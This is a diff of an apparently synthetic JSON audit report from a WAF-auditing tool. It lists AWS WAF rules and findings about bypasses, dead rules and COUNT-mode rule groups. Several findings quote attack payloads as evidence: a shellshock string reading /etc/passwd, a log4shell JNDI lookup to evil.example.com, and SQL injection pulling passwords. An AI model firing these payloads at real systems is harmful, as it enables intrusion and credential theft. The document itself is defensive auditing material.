+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockSpoofedReferers'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "OldGeoBlock",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 110,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'OldGeoBlock'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "DeprecatedBotDetection",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 120,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'DeprecatedBotDetection'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockHTTP09",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 130,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockHTTP09'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
+    },
+    {
+      "rule_name": "BlockOldSSL",
+      "web_acl_name": "legacy-edge-acl",
+      "scope": "REGIONAL",
+      "priority": 140,
+      "action": "BLOCK",
+      "rule_kind": "custom",
+      "statement_json": {
+        "ByteMatchStatement": {
+          "SearchString": "/admin",
+          "FieldToMatch": {
+            "UriPath": {}
+          },
+          "TextTransformations": [
+            {
+              "Priority": 0,
+              "Type": "LOWERCASE"
+            }
+          ],
+          "PositionalConstraint": "STARTS_WITH"
+        }
+      },
+      "hit_count": 0,
+      "last_fired": null,
+      "count_mode_hits": 0,
+      "sample_uris": [],
+      "fms_managed": false,
+      "override_action": null,
+      "managed_rule_overrides": [],
+      "ai_explanation": {
+        "explanation": "Custom rule 'BlockOldSSL'. No matches in 30 days \u2014 review with the rule owner.",
+        "working": false,
+        "concerns": null
+      }
     }
   ],
   "findings": [
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
       "type": "bypass_candidate",
       "severity": "high",
-      "title": "Possible WAF bypass: SQL-injection reached origin",
-      "description": "HTTP request containing SQL-injection payload in the query string was answered 200 OK by origin. Example URI: /search?q=1%27%20OR%201%3D1--.",
-      "recommendation": "Enable AWSManagedRulesSQLiRuleSet on the affected ACL.",
+      "title": "Possible WAF bypass: shellshock reached origin",
+      "description": "23 ALLOW'd requests carrying a shellshock signature in the User-Agent header reached origin over the last 30 days. Example URI: /?cmd=%28%29%20%7B%20%3A%3B%7D%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd.",
+      "recommendation": "Enable AWSManagedRulesKnownBadInputsRuleSet or AWSManagedRulesUnixRuleSet on this ACL.",
       "affected_rules": [
-        "ruleiq-prod-acl"
+        "prod-cf-edge-acl"
       ],
       "confidence": 0.95,
-      "severity_score": 60,
       "evidence": "log-sample",
-      "signature_class": null,
+      "signature_class": "shellshock",
+      "severity_score": 58,
       "impact": "Attack-shaped traffic is reaching your origin uninspected. If the payload is genuinely malicious, your WAF is providing no defense against this signature class. Direct relevance to SOC 2 CC6.6, PCI-DSS 6.6, ISO 27001 A.13.1.2.",
       "suggested_actions": [
         "Enable a managed rule group that covers this signature class. For shellshock / CVE patterns: AWSManagedRulesUnixRuleSet or AWSManagedRulesKnownBadInputsRuleSet. For SQLi gaps: AWSManagedRulesSQLiRuleSet. For XSS / Common: AWSManagedRulesCommonRuleSet.",
         "Deploy the chosen group in COUNT mode first; review the false-positive sample over 7 days; promote to BLOCK only after vetting."
       ],
       "verify_by": "Replay a captured suspicious request from the audit's `suspicious_request_sample` against the WAF after rollout \u2014 it should return 403.",
-      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console.",
-      "created_at": "2026-05-11T20:17:46.298000Z"
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
+      "type": "bypass_candidate",
+      "severity": "high",
+      "title": "Possible WAF bypass: log4shell reached origin",
+      "description": "47 ALLOW'd requests carrying a log4shell JNDI lookup payload in headers reached origin over the last 30 days. Example header: User-Agent: ${jndi:ldap://evil.example.com/exploit}.",
+      "recommendation": "Enable AWSManagedRulesKnownBadInputsRuleSet (log4j signatures included) on this ACL.",
+      "affected_rules": [
+        "api-gateway-protect"
+      ],
+      "confidence": 0.97,
+      "evidence": "log-sample",
+      "signature_class": "log4shell",
+      "severity_score": 59,
+      "impact": "Attack-shaped traffic is reaching your origin uninspected. If the payload is genuinely malicious, your WAF is providing no defense against this signature class. Direct relevance to SOC 2 CC6.6, PCI-DSS 6.6, ISO 27001 A.13.1.2.",
+      "suggested_actions": [
+        "Enable a managed rule group that covers this signature class. For shellshock / CVE patterns: AWSManagedRulesUnixRuleSet or AWSManagedRulesKnownBadInputsRuleSet. For SQLi gaps: AWSManagedRulesSQLiRuleSet. For XSS / Common: AWSManagedRulesCommonRuleSet.",
+        "Deploy the chosen group in COUNT mode first; review the false-positive sample over 7 days; promote to BLOCK only after vetting."
+      ],
+      "verify_by": "Replay a captured suspicious request from the audit's `suspicious_request_sample` against the WAF after rollout \u2014 it should return 403.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
+      "type": "bypass_candidate",
+      "severity": "high",
+      "title": "Possible WAF bypass: SQL injection reached origin",
+      "description": "11 ALLOW'd requests with SQL-injection payloads in the query string reached origin over the last 30 days. Example URI: /products?id=1%27%20UNION%20SELECT%20password%20FROM%20users--.",
+      "recommendation": "Enable AWSManagedRulesSQLiRuleSet on this ACL, or extend the existing SQLi rule's match conditions to cover the query string.",
+      "affected_rules": [
+        "prod-cf-edge-acl"
+      ],
+      "confidence": 0.92,
+      "evidence": "log-sample",
+      "signature_class": "sqli",
+      "severity_score": 56,
+      "impact": "Attack-shaped traffic is reaching your origin uninspected. If the payload is genuinely malicious, your WAF is providing no defense against this signature class. Direct relevance to SOC 2 CC6.6, PCI-DSS 6.6, ISO 27001 A.13.1.2.",
+      "suggested_actions": [
+        "Enable a managed rule group that covers this signature class. For shellshock / CVE patterns: AWSManagedRulesUnixRuleSet or AWSManagedRulesKnownBadInputsRuleSet. For SQLi gaps: AWSManagedRulesSQLiRuleSet. For XSS / Common: AWSManagedRulesCommonRuleSet.",
+        "Deploy the chosen group in COUNT mode first; review the false-positive sample over 7 days; promote to BLOCK only after vetting."
+      ],
+      "verify_by": "Replay a captured suspicious request from the audit's `suspicious_request_sample` against the WAF after rollout \u2014 it should return 403.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
+      "type": "count_mode_high_volume",
+      "severity": "high",
+      "title": "AWSManagedRulesKnownBadInputsRuleSet in COUNT mode with 4,217 hits",
+      "description": "Managed rule group 'AWSManagedRulesKnownBadInputsRuleSet' on Web ACL 'api-gateway-protect' is configured to COUNT, not BLOCK. It matched 4,217 requests in the last 30 days \u2014 these requests are being logged, not stopped.",
+      "recommendation": "Promote the rule group from COUNT to BLOCK after a 7-day false-positive review.",
+      "affected_rules": [
+        "AWSManagedRulesKnownBadInputsRuleSet"
+      ],
+      "confidence": 0.95,
+      "severity_score": 58,
+      "impact": "Rule appears active in the AWS console but is logging instead of blocking. Attacks matching this signature are being recorded, not stopped. Common cause: rule was deployed in COUNT for evaluation and never promoted.",
+      "suggested_actions": [
+        "High sustained COUNT volume strongly suggests the rule is mature. Schedule a promote-to-BLOCK window.",
+        "Snapshot a 200-event sample first; have an engineer spot-check for unexpected matches before flipping."
+      ],
+      "verify_by": "After promotion: monitor 403 rates and customer error reports for 48 hours. Roll back if false-positives spike.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
       "type": "dead_rule",
       "severity": "medium",
-      "title": "Dead rule: BlockLegacyAdminPath",
-      "description": "Rule 'BlockLegacyAdminPath' matched zero requests in the last 30 days.",
-      "recommendation": "Verify with the original author whether this protection is still required.",
+      "title": "Dead Custom Rule: BlockOldChinaIPs",
+      "description": "Custom rule 'BlockOldChinaIPs' on Web ACL 'internal-alb-waf' matched zero requests in the last 30 days. The rule's stated purpose (geo-blocking) does not match any signature in the suspicious-request sample \u2014 finding stays at MEDIUM.",
+      "recommendation": "Confirm with the rule owner whether the geo block is still required; if not, delete.",
       "affected_rules": [
-        "BlockLegacyAdminPath"
+        "BlockOldChinaIPs"
       ],
-      "confidence": 0.9,
-      "severity_score": 34,
-      "evidence": null,
-      "signature_class": null,
+      "confidence": 0.85,
+      "signature_class": "bad_ip",
+      "severity_score": 31,
       "impact": "If this rule was intended to be active, the traffic it was supposed to block is no longer being inspected. If obsolete, it's creating noise that slows incident response and inflates your rule-count quota.",
       "suggested_actions": [
         "Review with the original author / team. If the rule's purpose is no longer relevant, delete it.",
         "If the purpose is current but the rule isn't matching, audit the rule's statement against current traffic patterns \u2014 usually a field-name or encoding mismatch."
       ],
       "verify_by": "Confirm the rule's hit count over the next 30 days remains zero; OR if you intend it to fire, generate synthetic test traffic matching its statement and verify a hit.",
-      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console.",
-      "created_at": "2026-05-11T20:17:46.298000Z"
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
       "type": "dead_rule",
       "severity": "medium",
-      "title": "Dead rule: BlockOldStagingHeader",
-      "description": "Rule 'BlockOldStagingHeader' matched zero requests in the last 30 days.",
-      "recommendation": "Verify with the original author whether this protection is still required.",
+      "title": "Managed Rule Group Inactive: AWSManagedRulesBotControlRuleSet",
+      "description": "AWS-managed rule group 'AWSManagedRulesBotControlRuleSet' on Web ACL 'internal-alb-waf' matched zero requests in 30 days. Either traffic isn't reaching this group, or its patterns don't match your traffic shape.",
+      "recommendation": "Verify the ACL is attached to the right resource AND that the resource is serving the traffic you expect to inspect.",
       "affected_rules": [
-        "BlockOldStagingHeader"
-      ],
-      "confidence": 0.9,
-      "severity_score": 34,
-      "evidence": null,
-      "signature_class": null,
-      "impact": "If this rule was intended to be active, the traffic it was supposed to block is no longer being inspected. If obsolete, it's creating noise that slows incident response and inflates your rule-count quota.",
-      "suggested_actions": [
-        "Review with the original author / team. If the rule's purpose is no longer relevant, delete it.",
-        "If the purpose is current but the rule isn't matching, audit the rule's statement against current traffic patterns \u2014 usually a field-name or encoding mismatch."
-      ],
-      "verify_by": "Confirm the rule's hit count over the next 30 days remains zero; OR if you intend it to fire, generate synthetic test traffic matching its statement and verify a hit.",
-      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console.",
-      "created_at": "2026-05-11T20:17:46.298000Z"
-    },
-    {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
-      "type": "conflict",
-      "severity": "medium",
-      "title": "Contradicting rules on /admin",
-      "description": "Rule 'AllowOfficeIPRange' permits the office IP range while 'BlockOfficeIPRangeOnAdmin' blocks the same range on /admin. Rule priority will silently determine the outcome.",
-      "recommendation": "Confirm desired behaviour with the security owner and consolidate into a single explicit rule with the correct priority.",
-      "affected_rules": [
-        "AllowOfficeIPRange",
-        "BlockOfficeIPRangeOnAdmin"
+        "AWSManagedRulesBotControlRuleSet"
       ],
       "confidence": 0.8,
-      "severity_score": 32,
-      "evidence": null,
-      "signature_class": null,
+      "severity_score": 29,
+      "impact": "Either traffic isn't reaching this rule group (routing problem) or the rule group doesn't match your traffic patterns (configuration problem). Either way, the protection you're paying for isn't engaging.",
+      "suggested_actions": [
+        "Zero hits on a managed defensive group is often expected (no matching threats observed). Investigate only if the WAF is mis-placed (traffic bypassing it entirely) or if you have a specific compliance requirement to test coverage."
+      ],
+      "verify_by": "Confirm the WAF is on the request path: `curl -sI https://your-app/<sensitive-path>` should hit your WAF, visible in CloudWatch log volume.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
+      "type": "count_mode_with_hits",
+      "severity": "medium",
+      "title": "AWSManagedRulesLinuxRuleSet in COUNT mode with 312 hits",
+      "description": "Managed rule group 'AWSManagedRulesLinuxRuleSet' on Web ACL 'prod-cf-edge-acl' is in COUNT mode and matched 312 requests in 30 days. Volume is below the high-volume threshold but still represents protection that logs instead of blocks.",
+      "recommendation": "Promote to BLOCK after a short FP-review window, or formally accept the COUNT-mode tradeoff.",
+      "affected_rules": [
+        "AWSManagedRulesLinuxRuleSet"
+      ],
+      "confidence": 0.85,
+      "severity_score": 31,
+      "impact": "Rule appears active in the AWS console but is logging instead of blocking. Attacks matching this signature are being recorded, not stopped. Common cause: rule was deployed in COUNT for evaluation and never promoted.",
+      "suggested_actions": [
+        "Review whether the rule is sufficiently mature to promote from COUNT to BLOCK.",
+        "Sample the COUNT hits \u2014 if all match the intended signature, promote. If you see legitimate-looking matches, refine the statement first."
+      ],
+      "verify_by": "After promotion: the rule's hit_count should redistribute (originally-COUNT hits become BLOCKs). Monitor for 7 days for unexpected blocks before considering the change stable.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
+      "type": "managed_rule_override_count",
+      "severity": "medium",
+      "title": "Managed rule SQLI_BODY overridden to COUNT inside AWSManagedRulesSQLiRuleSet",
+      "description": "An override on 'api-gateway-protect' demotes the SQLI_BODY sub-rule of AWSManagedRulesSQLiRuleSet from BLOCK to COUNT. The override is not visible at the group level in the WAF console \u2014 only inside the rule-group action overrides panel.",
+      "recommendation": "Review whether the override is still required; remove if the original false-positive that prompted it has been resolved upstream.",
+      "affected_rules": [
+        "AWSManagedRulesSQLiRuleSet"
+      ],
+      "confidence": 0.9,
+      "severity_score": 33,
+      "impact": "A managed rule inside this group has been overridden to COUNT. The override is invisible at the group level, but the specific protection is logging, not blocking.",
+      "suggested_actions": [
+        "Review whether the sub-rule override to COUNT is still intentional. Common reason: an early false-positive that has since been addressed by upstream signature updates.",
+        "If no current rationale, remove the override so the managed group's default action applies."
+      ],
+      "verify_by": "After removal: the managed group's default action applies. Monitor hit volumes for 7 days for unexpected blocks.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
+      "type": "conflict",
+      "severity": "medium",
+      "title": "Two 'BlockAdminPath' Rules across ACLs",
+      "description": "A rule named 'BlockAdminPath' exists on both 'prod-cf-edge-acl' and 'internal-alb-waf'. The definitions drift independently \u2014 a security fix applied in one place may silently miss the other.",
+      "recommendation": "Consolidate by promoting the rule to a shared RuleGroup (or AWS Firewall Manager policy) and reference it from both ACLs.",
+      "affected_rules": [
+        "BlockAdminPath"
+      ],
+      "confidence": 0.8,
+      "evidence": "cross_acl_same_name",
+      "severity_score": 29,
       "impact": "Two rules with overlapping or identical match conditions create unpredictable evaluation order, and one is effectively dead code. Cleanup reduces noise in your audit and speeds future incident response.",
       "suggested_actions": [
         "Consolidate into one ACL on the resource. Conflicting priorities can produce unpredictable behavior.",
         "Verify rule statements are identical before merging \u2014 subtle differences (text transformations, field-to-match) are why duplicates were created in the first place."
       ],
       "verify_by": "After consolidation: re-run a RuleIQ audit and confirm no duplicate finding is produced for this rule pair.",
-      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console.",
-      "created_at": "2026-05-11T20:17:46.298000Z"
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
+      "type": "orphaned_web_acl",
+      "severity": "low",
+      "title": "Web ACL 'legacy-edge-acl' is not attached to any resource",
+      "description": "Web ACL 'legacy-edge-acl' (REGIONAL) lists 14 rules but is attached to no resources. AWS still bills the $5/mo ACL fee plus the per-rule fees, and the rules inside the ACL are completely dormant.",
+      "recommendation": "Confirm with the owner whether the ACL is still required; if not, delete the Web ACL and its rules together.",
+      "affected_rules": [
+        "legacy-edge-acl"
+      ],
+      "confidence": 0.99,
+      "severity_score": 18,
+      "impact": "Pure operational waste \u2014 fixed monthly fee with zero traffic served. Also creates audit confusion: reviewers see an attached-looking Web ACL that does nothing.",
+      "suggested_actions": [
+        "Either attach the ACL to a resource that needs protection, or delete it to stop the $5/mo fixed fee.",
+        "If recently detached during migration, confirm the intended target was reattached."
+      ],
+      "verify_by": "After deletion: `aws wafv2 list-web-acls --scope <scope>` should not list it. After re-attachment: `aws wafv2 list-resources-for-web-acl --web-acl-arn <arn>` returns the new resource.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
       "type": "quick_win",
       "severity": "low",
-      "title": "Duplicate rule: BlockMaliciousIPsDuplicate",
-      "description": "Rule 'BlockMaliciousIPsDuplicate' references the same IP set as 'BlockKnownMaliciousIPs' with no additional scope.",
-      "recommendation": "Delete BlockMaliciousIPsDuplicate after confirming hit counts.",
+      "title": "BlockOldCurlScanners Unused",
+      "description": "Custom rule 'BlockOldCurlScanners' on the orphaned ACL 'legacy-edge-acl' has zero hits and is single-instance (no shared resource, no other duplicate). Looks obsolete.",
+      "recommendation": "Delete the rule once you've confirmed it isn't referenced by any out-of-band tooling.",
       "affected_rules": [
-        "BlockKnownMaliciousIPs",
-        "BlockMaliciousIPsDuplicate"
+        "BlockOldCurlScanners"
       ],
-      "confidence": 0.9,
-      "severity_score": 18,
-      "evidence": null,
-      "signature_class": null,
+      "confidence": 0.85,
+      "severity_score": 15,
       "impact": "Low-risk rule cleanup. Reduces console clutter, improves onboarding for new engineers, and shrinks your security review surface area.",
       "suggested_actions": [
         "Verify with the rule's original author whether the protection is still needed. If obsolete, delete the rule to reduce console clutter and audit surface area."
       ],
       "verify_by": "After deletion: confirm the rule is removed via `aws wafv2 get-web-acl` and that the next 30-day audit no longer flags it.",
-      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console.",
-      "created_at": "2026-05-11T20:17:46.298000Z"
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
     },
     {
-      "audit_run_id": "6a02396a1e942ea2c3528591",
       "type": "fms_review",
       "severity": "low",
-      "title": "FMS-managed rule: FMS-AWSManagedRulesCommonRuleSet",
-      "description": "Controlled by your central security admin via Firewall Manager.",
-      "recommendation": "Escalate to the central security team or accept as out-of-scope.",
+      "title": "FMS-managed AWSManagedRulesAmazonIpReputationList has zero hits",
+      "description": "FMS-managed rule 'AWSManagedRulesAmazonIpReputationList' on 'api-gateway-protect' matched zero requests in 30 days. Cannot be modified directly \u2014 controlled by a delegated Firewall Manager admin.",
+      "recommendation": "Escalate to the central security team with this audit attached, or accept the rule as out-of-scope for this account.",
       "affected_rules": [
-        "FMS-AWSManagedRulesCommonRuleSet"
+        "AWSManagedRulesAmazonIpReputationList"
       ],
-      "confidence": 0.85,
+      "confidence": 0.9,
       "severity_score": 16,
-      "evidence": null,
-      "signature_class": null,
       "impact": "You cannot fix this directly \u2014 the rule is controlled by another team via Firewall Manager. But it appears in your audit report and must either be escalated or formally accepted as out-of-scope.",
       "suggested_actions": [
         "Flag to the central security / Firewall Manager admin team. The rule is controlled by a delegated admin account and cannot be modified locally."
       ],
       "verify_by": "The FMS admin team confirms either intent or remediation for the central policy.",
-      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console.",
-      "created_at": "2026-05-11T20:17:46.298000Z"
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
+      "type": "quick_win",
+      "severity": "low",
+      "title": "Stranded Rule: BlockTorExitNodes lives only on orphaned ACL",
+      "description": "Rule 'BlockTorExitNodes' exists only on the orphaned ACL 'legacy-edge-acl'. It protects nothing because the ACL isn't attached to any resource \u2014 the rule is dead code.",
+      "recommendation": "Either delete the orphan ACL (preferred \u2014 removes the rule along with it) or move the rule to an attached ACL if still needed.",
+      "affected_rules": [
+        "BlockTorExitNodes"
+      ],
+      "confidence": 0.95,
+      "evidence": "stranded",
+      "severity_score": 17,
+      "impact": "A rule duplicate exists on an orphaned Web ACL that protects nothing. The duplicate is dead code \u2014 it consumes audit attention and adds to your rule-count quota without providing any defense. Cleanup is mechanical: either delete the orphan ACL or remove the redundant rule from it.",
+      "suggested_actions": [
+        "Remove the duplicate rule from the orphaned ACL \u2014 it is protecting nothing.",
+        "OR restore the orphan's intended resource attachment if the orphaning was unintentional."
+      ],
+      "verify_by": "After cleanup: re-run a RuleIQ audit and confirm the stranded finding is gone.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
+    },
+    {
+      "type": "quick_win",
+      "severity": "low",
+      "title": "Duplicate RateLimit-PerIP rule on prod-cf-edge-acl",
+      "description": "Two rate-based rules \u2014 'RateLimit-PerIP' and 'RateLimit-PerIP-Duplicate' \u2014 have identical statements and both attach to the same CloudFront distribution. One of the two is redundant.",
+      "recommendation": "Delete the lower-priority duplicate after confirming hit counts match within a rounding margin.",
+      "affected_rules": [
+        "RateLimit-PerIP",
+        "RateLimit-PerIP-Duplicate"
+      ],
+      "confidence": 0.88,
+      "evidence": "shared_resource",
+      "severity_score": 16,
+      "impact": "Low-risk rule cleanup. Reduces console clutter, improves onboarding for new engineers, and shrinks your security review surface area.",
+      "suggested_actions": [
+        "Review the redundancy in the rule pair and remove the weaker / less-specific copy."
+      ],
+      "verify_by": "After cleanup: re-run a RuleIQ audit and confirm the duplicate finding is gone, and the remaining rule's hit count includes the merged traffic.",
+      "disclaimer": "RuleIQ does not generate WAF rules. Recommendations point to AWS-maintained managed groups and high-level configuration changes. Deploy new rules in COUNT mode for 7+ days before promoting to BLOCK to assess false-positive risk. Test in non-production WAFs when possible. Rollback plan: detach the new rule group via the WAF console."
     }
   ]
 }
